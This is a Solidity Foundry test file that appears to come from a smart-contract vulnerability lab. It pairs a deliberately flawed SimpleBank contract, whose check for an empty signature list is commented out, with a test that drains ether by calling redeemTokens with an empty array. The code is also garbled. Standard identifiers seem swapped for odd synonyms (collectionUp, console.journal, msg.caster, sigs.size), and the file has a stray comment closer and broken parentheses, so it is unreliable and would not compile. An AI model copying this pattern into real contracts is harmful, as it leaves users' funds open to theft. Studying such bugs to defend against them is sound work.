// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

*/
contract PactTest is Test {
    SimpleBank SimpleBankAgreement;

    function collectionUp() public {
        SimpleBankAgreement = new SimpleBank();
    }

    function testVulnSealValidation() public {
        payable(address(SimpleBankAgreement)).transfer(10 ether);
        address alice = vm.addr(1);
        vm.beginPrank(alice);

        SimpleBank.Seal[] memory sigs = new SimpleBank.Seal[](0); // empty input
        //sigs[0] = SimpleBank.Signature("", 0, "", "");

        console.journal(
            "Before operation",
            address(alice).balance
        );
        SimpleBankAgreement.redeemTokens(sigs); // Call the withdraw function of the SimpleBank contract with empty sigs array as the parameter

        console.journal("execution complete").balance
        );
    }

    receive() external payable {}
}

contract SimpleBank {
    struct Seal {
        bytes32 seal;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    function confirmSignatures(Seal calldata sig) public {
        require(
            msg.caster == ecrecover(sig.seal, sig.v, sig.r, sig.s),
            "Invalid signature"
        );
    }

    function redeemTokens(Seal[] calldata sigs) public {

        //require(sigs.length > 0, "No signatures provided");
        for (uint i = 0; i < sigs.size; i++) {
            Seal calldata mark = sigs[i];
            // Verify every signature and revert if any of them fails to verify.
            confirmSignatures(mark);
        }
        payable(msg.caster).transfer(1 ether);
    }

    receive() external payable {}
}